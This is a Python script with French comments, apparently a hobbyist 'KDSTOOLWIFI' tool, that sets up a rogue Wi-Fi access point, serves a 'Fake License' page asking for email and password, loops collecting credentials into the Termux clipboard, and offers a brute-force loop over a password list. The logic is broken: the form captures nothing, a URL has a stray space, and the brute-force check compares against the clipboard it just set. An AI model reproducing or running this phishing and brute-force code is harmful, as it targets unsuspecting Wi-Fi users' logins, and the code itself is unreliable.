import os
import subprocess
import getpass
from colorama import init, Fore, Back, Style
import requests
import itertools
import pywifi
import http.server
import socketserver
import threading

init(autoreset=True)

# Titre en ASCII
print(Fore.GREEN + """
  _______
 /       \
|  KDSTOOLWIFI  |
 _______/
""")

# Demande le nom du réseau Wi-Fi
wifi_name = input(Fore.CYAN + "Entrez le nom de votre réseau Wi-Fi : ")

# Demande si l'utilisateur veut mettre un mot de passe
password_required = input(Fore.CYAN + "Voulez-vous mettre un mot de passe pour votre réseau Wi-Fi ? (o/n) : ")

if password_required.lower() == 'o':
    # Demande le mot de passe
    password = getpass.getpass(Fore.CYAN + "Entrez le mot de passe pour votre réseau Wi-Fi : ")
else:
    password = None

# Crée le réseau Wi-Fi
if os.path.exists('/sys/class/net/wlan0'):
    interface = 'wlan0'
elif os.path.exists('/sys/class/net/wlan1'):
    interface = 'wlan1'
else:
    print(Fore.RED + "Erreur : Aucune interface Wi-Fi disponible.")
    exit(1)

print(Fore.GREEN + f"Création du réseau Wi-Fi {wifi_name} sur l'interface {interface}...")

# Crée le fichier de configuration du réseau Wi-Fi
with open('hostapd.conf', 'w') as f:
    f.write(f"interface={interface}\n")
    f.write(f"driver=nl80211\n")
    f.write(f"ssid={wifi_name}\n")
    if password:
        f.write(f"wpa_passphrase={password}\n")
        f.write("wpa=2\n")
        f.write("wpa_key_mgmt=WPA-PSK\n")
        f.write("wpa_pairwise=TKIP\n")
        f.write("rsn_pairwise=CCMP\n")

# Démarre le service hostapd
subprocess.run(['hostapd', '-B', 'hostapd.conf'])

print(Fore.GREEN + "Réseau Wi-Fi créé avec succès !")

# Crée une page HTML
html = """
<html>
  <body>
    <h1>Fake License</h1>
    <form>
      <label for="email">Email:</label>
      <input type="email" id="email" name="email"><br><br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password"><br><br>
      <input type="submit" value="Submit">
    </form>
  </body>
</html>
"""

# Enregistrez la page HTML dans un fichier
with open("index.html", "w") as f:
    f.write(html)

# Créez un serveur HTTP simple pour servir la page HTML
def serve_http():
    with socketserver.TCPServer(("", 80), http.server.SimpleHTTPRequestHandler) as httpd:
        print("Serving HTTP on port 80...")
        httpd.serve_forever()

# Démarrez le serveur HTTP dans un thread séparé
threading.Thread(target=serve_http).start()

# Affiche une page de connexion pour les utilisateurs
print(Fore.CYAN + """
  _______
 /       \
|  Connexion au réseau Wi-Fi  |
 _______/
""")

while True:
    # Attends que quelqu'un se connecte
    subprocess.run(['hostapd_cli', 'all_sta'])

    # Affiche les informations de connexion
    print(Fore.GREEN + "Un utilisateur a tenté de se connecter !")
    print(Fore.CYAN + "Entrez votre adresse e-mail et votre mot de passe pour vous connecter : ")
    email = input("Adresse e-mail : ")
    password = input("Mot de passe : ")

    # Envoie les informations de connexion à Termux
    subprocess.run(['termux-clipboard-set', email])
    subprocess.run(['termux-clipboard-set', password])

    print(Fore.GREEN + "Informations de connexion envoyées à Termux !")

    # Redirige l'utilisateur vers la page HTML
    os.system(f"curl -X GET http://localhost:80/index .html")

    # Option pour brute forcer des mots de passe
    brute_force = input(Fore.CYAN + "Voulez-vous essayer de brute forcer des mots de passe ? (o/n) : ")
    if brute_force.lower() == 'o':
        # Demande le nom d'utilisateur et le fichier de mots de passe
        username = input("Nom d'utilisateur : ")
        password_file = input("Fichier de mots de passe : ")

        # Lit le fichier de mots de passe
        with open(password_file, 'r') as f:
            passwords = f.readlines()

        # Essaie chaque mot de passe
        for password in passwords:
            password = password.strip()
            print(Fore.CYAN + f"Essai du mot de passe : {password}")
            # Envoie le mot de passe à Termux
            subprocess.run(['termux-clipboard-set', password])
            # Attends la réponse de Termux
            response = subprocess.run(['termux-clipboard-get'], stdout=subprocess.PIPE)
            if response.stdout.decode().strip() == "Connexion réussie !":
                print(Fore.GREEN + f"Mot de passe correct : {password}")
                break
